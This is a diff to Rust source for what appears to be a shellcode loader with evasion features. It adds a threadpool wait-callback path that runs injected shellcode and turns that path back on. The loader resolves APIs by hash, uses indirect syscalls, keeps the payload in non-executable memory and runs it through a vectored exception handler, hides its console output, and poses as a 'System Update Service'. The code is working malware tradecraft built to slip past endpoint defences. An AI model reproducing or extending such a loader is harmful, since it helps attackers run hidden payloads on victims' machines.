@@ -5,6 +5,7 @@
 #![allow(unused_variables)]
 #![allow(unused_unsafe)]
 #![allow(unused_mut)]
+
 use aes_gcm::{
     aead::{Aead, KeyInit},
     Aes256Gcm, Nonce,
@@ -80,6 +81,11 @@ const HASH_CONVERT_THREAD_TO_FIBER: u32 = 0x32eec10a;
 const HASH_CREATE_FIBER: u32 = 0xfc6ccfec;
 const HASH_SWITCH_TO_FIBER: u32 = 0x1a237841;
 
+const HASH_TP_ALLOC_WAIT: u32 = 0x0635b770;
+const HASH_TP_SET_WAIT: u32 = 0x619d00ff;
+const HASH_NT_CREATE_EVENT: u32 = 0xb7879a40;
+const HASH_NT_SET_EVENT: u32 = 0x96a779c6;
+
 const EXCEPTION_ACCESS_VIOLATION: i32 = 0xC0000005u32 as i32;
 const EXCEPTION_CONTINUE_EXECUTION: i32 = -1;
 const EXCEPTION_CONTINUE_SEARCH: i32 = 0;
@@ -148,6 +154,35 @@ type FnCreateFiber = unsafe extern "system" fn(
 ) -> *mut core::ffi::c_void;
 #[allow(dead_code)]
 type FnSwitchToFiber = unsafe extern "system" fn(lp_fiber: *mut core::ffi::c_void);
+
+#[allow(dead_code)]
+type FnTpAllocWait = unsafe extern "system" fn(
+    out_wait: *mut isize,
+    callback: unsafe extern "system" fn(
+        instance: *mut core::ffi::c_void,
+        context: *mut core::ffi::c_void,
+        wait: *mut core::ffi::c_void,
+        waitresult: u32,
+    ),
+    context: *mut core::ffi::c_void,
+    environ: *mut core::ffi::c_void,
+) -> i32;
+
+#[allow(dead_code)]
+type FnTpSetWait =
+    unsafe extern "system" fn(wait: isize, handle: isize, timeout: *mut core::ffi::c_void);
+
+#[allow(dead_code)]
+type FnNtCreateEvent = unsafe extern "system" fn(
+    event_handle: *mut isize,
+    desired_access: u32,
+    object_attributes: *mut OBJECT_ATTRIBUTES,
+    event_type: i32,
+    initial_state: u8,
+) -> i32;
+
+#[allow(dead_code)]
+type FnNtSetEvent = unsafe extern "system" fn(event_handle: isize, previous_state: *mut i32) -> i32;
 
 // --- Utils ---
 
@@ -1059,21 +1094,120 @@ unsafe extern "system" fn fiber_start(param: *mut core::ffi::c_void) {
     }
 }
 
+unsafe extern "system" fn wait_callback(
+    _instance: *mut core::ffi::c_void,
+    _context: *mut core::ffi::c_void,
+    _wait: *mut core::ffi::c_void,
+    _waitresult: u32,
+) {
+    if SC_ADDR != 0 {
+        let code: unsafe extern "system" fn() = core::mem::transmute(SC_ADDR);
+        code();
+    }
+}
+
 unsafe fn exec_threadpool(base: *mut core::ffi::c_void, _size: usize) -> bool {
     let k32 = get_kernel32_base();
 
-    // Attempt 1: EnumSystemLocalesA (Synchronous Callback)
+    let ntdll = get_ntdll_base();
+
+    // Method 1: TpAllocWait / TpSetWait (NTDLL)
+    let addr_alloc_wait = get_export_addr(ntdll, HASH_TP_ALLOC_WAIT);
+    let addr_set_wait = get_export_addr(ntdll, HASH_TP_SET_WAIT);
+    let addr_create_event = get_export_addr(ntdll, HASH_NT_CREATE_EVENT);
+    let addr_set_event = get_export_addr(ntdll, HASH_NT_SET_EVENT);
+
+    if let (Some(a_alloc_wait), Some(a_set_wait), Some(a_create_event), Some(a_set_event)) = (
+        addr_alloc_wait,
+        addr_set_wait,
+        addr_create_event,
+        addr_set_event,
+    ) {
+        let tp_alloc_wait: FnTpAllocWait = core::mem::transmute(a_alloc_wait);
+        let tp_set_wait: FnTpSetWait = core::mem::transmute(a_set_wait);
+        let nt_create_event: FnNtCreateEvent = core::mem::transmute(a_create_event);
+        let nt_set_event: FnNtSetEvent = core::mem::transmute(a_set_event);
+
+        log_debug("Executing via Threadpool Wait Callback (NT API)...");
+
+        let mut h_event: isize = 0;
+        let mut oa: OBJECT_ATTRIBUTES = core::mem::zeroed();
+        oa.Length = core::mem::size_of::<OBJECT_ATTRIBUTES>() as u32;
+
+        // SynchronizationEvent = 1 (AutoReset), InitialState = 0 (False)
+        let status = nt_create_event(&mut h_event, 0x1F0003, &mut oa, 1, 0);
+
+        if status == 0 && h_event != 0 {
+            log_debug(&format!("Event created: {:x}", h_event));
+
+            let mut wait: isize = 0;
+            let status_alloc = tp_alloc_wait(
+                &mut wait,
+                wait_callback,
+                core::ptr::null_mut(),
+                core::ptr::null_mut(),
+            );
+
+            if status_alloc == 0 && wait != 0 {
+                log_debug(&format!("Wait object created: {:x}", wait));
+
+                tp_set_wait(wait, h_event, core::ptr::null_mut());
+                log_debug("Wait object set");
+
+                let status_set = nt_set_event(h_event, core::ptr::null_mut());
+                log_debug(&format!("NtSetEvent status: {:x}", status_set));
+
+                if status_set == 0 {
+                    // Create dummy event for infinite wait
+                    let mut h_dummy: isize = 0;
+                    // NotificationEvent = 0 (ManualReset), InitialState = 0 (False)
+                    let _ = nt_create_event(&mut h_dummy, 0x1F0003, &mut oa, 0, 0);
+
+                    if h_dummy != 0 {
+                        log_debug("Waiting indefinitely on dummy event...");
+                        let (ssn_wait, addr_wait) =
+                            get_ssn_indirect(HASH_NT_WAIT_FOR_SINGLE_OBJECT).unwrap_or((0x4, 0));
+                        if addr_wait != 0 {
+                            syscall(
+                                ssn_wait,
+                                addr_wait,
+                                h_dummy as usize, // Handle
+                                0,                // Alertable: FALSE
+                                0,                // Timeout: NULL (Infinite)
+                                0,
+                                0,
+                                0,
+                                0,
+                                0,
+                                0,
+                                0,
+                                0,
+                            );
+                        }
+                        CloseHandle(h_dummy);
+                    }
+                    CloseHandle(h_event);
+                    return true;
+                }
+                CloseHandle(h_event);
+            } else {
+                CloseHandle(h_event);
+            }
+        }
+    }
+
+    // Method 2: EnumSystemLocalesA (Synchronous Callback)
     // This is better for VEH handling as it runs in the current thread context
     let addr_enum = get_export_addr(k32, HASH_ENUM_SYSTEM_LOCALES_A);
     if let Some(a_enum) = addr_enum {
         let enum_locales: FnEnumSystemLocalesA = core::mem::transmute(a_enum);
-        println!("Executing via EnumSystemLocalesA callback...");
+        log_debug("Executing via EnumSystemLocalesA callback...");
         enum_locales(base, 0);
-        println!("EnumSystemLocalesA returned.");
+        log_debug("EnumSystemLocalesA returned.");
         return true;
     }
 
-    // Fallback: Threadpool (Asynchronous)
+    // Method 3: Threadpool Work (Old method)
     let addr_create = get_export_addr(k32, HASH_CREATE_THREADPOOL_WORK);
     let addr_submit = get_export_addr(k32, HASH_SUBMIT_THREADPOOL_WORK);
     let addr_wait = get_export_addr(k32, HASH_WAIT_FOR_THREADPOOL_WORK_CALLBACKS);
@@ -1087,18 +1221,18 @@ unsafe fn exec_threadpool(base: *mut core::ffi::c_void, _size: usize) -> bool {
         let wait: FnWaitForThreadpoolWorkCallbacks = core::mem::transmute(a_wait);
         let close: FnCloseThreadpoolWork = core::mem::transmute(a_close);
 
-        println!("Executing via Threadpool...");
+        // println!("Executing via Threadpool Work...");
         let work_handle = create(
             core::mem::transmute(base),
             core::ptr::null_mut(),
             core::ptr::null_mut(),
         );
-        println!("Threadpool Work Handle: {:x}", work_handle);
+        // println!("Threadpool Work Handle: {:x}", work_handle);
         if work_handle != 0 {
             submit(work_handle);
-            println!("Threadpool Work Submitted. Waiting...");
+            // println!("Threadpool Work Submitted. Waiting...");
             wait(work_handle, 0);
-            println!("Threadpool Wait Returned.");
+            // println!("Threadpool Wait Returned.");
             close(work_handle);
             return true;
         }
@@ -1110,23 +1244,23 @@ include!(concat!(env!("OUT_DIR"), "/generated.rs"));
 
 fn init_logging() {
     // println!("[INFO] Initializing System Update Service v1.4.2.0...");
-    if let Ok(now) = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH) {
+    if let Ok(_now) = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH) {
         // println!("[INFO] Timestamp: {}", now.as_secs());
     }
     // println!("[INFO] Loading configuration from registry...");
-    unsafe {
-        let mut h_key = 0;
-        // Obfuscated "Software\SystemMaintenance\Config"
-        // Just dummy check
-        let subkey = [0u8; 1];
-        // let status = RegOpenKeyExA(HKEY_CURRENT_USER, subkey.as_ptr(), 0, KEY_READ, &mut h_key);
-        // if status == 0 {
-        //    RegCloseKey(h_key);
-        // println!("[INFO] Configuration loaded.");
-        // } else {
-        // println!("[INFO] Default configuration loaded.");
-        // }
-    }
+
+    let mut _h_key = 0;
+    // Obfuscated "Software\SystemMaintenance\Config"
+    // Just dummy check
+    let _subkey = [0u8; 1];
+    // let status = RegOpenKeyExA(HKEY_CURRENT_USER, subkey.as_ptr(), 0, KEY_READ, &mut h_key);
+    // if status == 0 {
+    //    RegCloseKey(h_key);
+    // println!("[INFO] Configuration loaded.");
+    // } else {
+    // println!("[INFO] Default configuration loaded.");
+    // }
+
     // println!("[INFO] Checking system compatibility...");
     let mut x = JUNK_SEED_1;
     for _ in 0..JUNK_LOOP_COUNT {
@@ -1550,6 +1684,10 @@ fn main() {
                 let mut alloc_base: usize = 0;
                 let mut alloc_size = sc_len + 256 * 1024;
 
+                log_debug(&format!(
+                    "Calling NtAllocateVirtualMemory: SSN={:x}, Addr={:x}",
+                    ssn_alloc, addr_alloc
+                ));
                 let status_alloc = syscall(
                     ssn_alloc,
                     addr_alloc,
@@ -1566,6 +1704,10 @@ fn main() {
                     0,
                 );
 
+                log_debug(&format!(
+                    "NtAllocateVirtualMemory returned: {:x}",
+                    status_alloc
+                ));
                 if status_alloc == 0 {
                     let offset = 32 * 1024;
                     if offset + sc_len < alloc_size {
@@ -1575,14 +1717,15 @@ fn main() {
                     }
                 }
 
-                println!("Alloc ptr: {:?}", base);
+                // log_debug(&format!("Alloc ptr: {:?}", base));
 
                 if !base.is_null() {
                     let dst = core::slice::from_raw_parts_mut(base as *mut u8, sc_len);
 
-                    println!("Writing memory via memcpy...");
+                    // println!("Writing memory via memcpy...");
                     dst.copy_from_slice(sc);
-                    println!("Write done");
+                    // println!("Write done");
+                    // log_debug("Write done");
 
                     // VEH-based Execution Evasion:
                     // Do NOT set PAGE_EXECUTE_READ. Leave as PAGE_READWRITE.
@@ -1591,8 +1734,8 @@ fn main() {
                     SC_ADDR = base as usize;
                     SC_SIZE = sc_len;
 
-                    let veh_handle = AddVectoredExceptionHandler(1, Some(veh_guard));
-                    println!("VEH Registered: {:p}", veh_handle);
+                    let _veh_handle = AddVectoredExceptionHandler(1, Some(veh_guard));
+                    // println!("VEH Registered: {:p}", veh_handle);
 
                     // Skip explicit protection
                     let res = 0;
@@ -1631,7 +1774,7 @@ fn main() {
                         }
                         */
 
-                        println!("Executing...");
+                        // println!("Executing...");
                         use rand::RngCore;
                         let mut rng_key = [0u8; 1];
                         rand::thread_rng().fill_bytes(&mut rng_key);
@@ -1642,16 +1785,15 @@ fn main() {
 
                         // Try Threadpool first if obfuscated, else Fiber
                         let mut executed = false;
-                        /*
+
                         if flag > 0 {
                             if exec_threadpool(base, sc_len) {
                                 executed = true;
                             }
                         }
-                        */
 
                         if !executed {
-                            println!("Executing via Fiber...");
+                            // println!("Executing via Fiber...");
                             let addr_convert = get_export_addr(k32, HASH_CONVERT_THREAD_TO_FIBER);
                             let addr_create = get_export_addr(k32, HASH_CREATE_FIBER);
                             let addr_switch = get_export_addr(k32, HASH_SWITCH_TO_FIBER);
